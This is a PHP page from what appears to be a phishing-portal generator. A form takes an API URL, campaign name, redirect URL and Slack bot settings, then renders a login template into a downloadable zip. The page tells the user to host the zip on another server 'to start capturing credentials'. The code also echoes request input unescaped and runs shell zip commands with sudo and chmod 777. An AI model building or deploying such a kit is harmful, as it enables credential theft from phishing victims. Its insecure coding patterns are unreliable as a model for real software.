<?php

if(isset($_REQUEST['template'])){$template = $_REQUEST['template'];}else{$template = "";}

if(!isset($_REQUEST['APIURL'])){

?>

<HTML>
<HEAD>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="../main.css">
</HEAD>
<BODY>
<br><br><br><CENTER>
<FORM METHOD="POST"  ACTION="<?php $_SERVER["PHP_SELF"]; ?>">
<TABLE>
<TR><TH COLSPAN="2">Specifiy API Details for Form Submission</TH></TR>
<TR><TD>API URL: </TD><TD><INPUT TYPE="text" NAME="APIURL" VALUE="https://<?php echo $_SERVER['SERVER_NAME'];?>" PLACEHOLDER="This API URL" SIZE="40"></TD></TR>
<TR><TD>Project Name: </TD><TD><INPUT TYPE="text" NAME="Project" VALUE="" PLACEHOLDER="Project Name / Org / Phishing Campaign" SIZE="40"></TD></TR>
<TR><TD>Redirect URL: </TD><TD><INPUT TYPE="text" NAME="Redirect" VALUE="https://" PLACEHOLDER="Redirect Location Post Login" SIZE="40"></TD></TR>
<TR><TD>Slack Bot Name: </TD><TD><INPUT TYPE="text" NAME="SlackBotName" VALUE="PhishBot" PLACEHOLDER="Slack Bot Name" SIZE="40"></TD></TR>
<TR><TD>Slack Bot Logo: </TD><TD><INPUT TYPE="text" NAME="SlackEmoji" VALUE=":fishing_pole_and_fish:" PLACEHOLDER="Slack Bot Logo" SIZE="40"></TD></TR>
<TR><TD>Website Logo URL: </TD><TD><INPUT TYPE="text" NAME="ImageLogo" VALUE="" PLACEHOLDER="Use HTTPS to Avoid Mixed Content" SIZE="40"></TD></TR>
</TABLE><br>
<INPUT TYPE="HIDDEN" NAME="templatename" VALUE="<?php echo $template; ?>">
<INPUT TYPE="SUBMIT" VALUE="Generate Portal">
</FORM>
</CENTER>
</BODY>
</HTML>
<?php } else {

if(isset($_REQUEST['APIURL'])){$APIURL = $_REQUEST['APIURL'];}else{$APIURL = $_SERVER['SERVER_NAME'];}
if(isset($_REQUEST['Project']) && $_REQUEST['Project'] != ""){$Project = $_REQUEST['Project'];}else{$Project = "Undefined Project";}
if(isset($_REQUEST['Redirect']) && $_REQUEST['Redirect'] != "https://"){$Redirect = $_REQUEST['Redirect'];}else{$Redirect = "https://www.google.com";}
if(isset($_REQUEST['SlackBotName'])){$SlackBotName = $_REQUEST['SlackBotName'];}else{$SlackBotName = "PhishBot";}
if(isset($_REQUEST['SlackEmoji'])){$SlackEmoji = $_REQUEST['SlackEmoji'];}else{$SlackEmoji = ":fishing_pole_and_fish:";}
if(isset($_REQUEST['ImageLogo'])){$ImageLogo = $_REQUEST['ImageLogo'];}else{$ImageLogo = "";}
      
$templatename = preg_replace('/[^a-zA-Z0-9 ]/', '', $_REQUEST['templatename']);

$htmlpath = $templatename."/template.php";

//include($htmlpath);

ob_start();
include_once($htmlpath);
$html = ob_get_contents();
ob_end_clean();

$my_file = $templatename."/index.html";
$handle = fopen($my_file, 'w') or die('Cannot open file:  '.$my_file);
fwrite($handle, $html);

$cmdzipup = "cd ".$templatename."; sudo zip -r ../".$templatename.".zip ".$templatename." *; sudo chmod 777 ../".$templatename.".zip; rm index.html;";
exec($cmdzipup);

?>

<HTML>
<HEAD>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="../main.css">
</HEAD>
<BODY><br><br><br>
<FORM ACTION="<?php echo $templatename; ?>.zip" METHOD="GET">
<button class="btn" style="width:100%" type="submit"><i class="fa fa-download"></i> Download Source HTML</button>
</FORM>
<CENTER>
<FONT COLOR="#FFFFFF">Extract contents into your web directory on another server to start capturing credentials!  Feel free to modify the source code to include your own logo/theme!</FONT>
</CENTER>
</BODY>
</HTML>

<?php } ?>
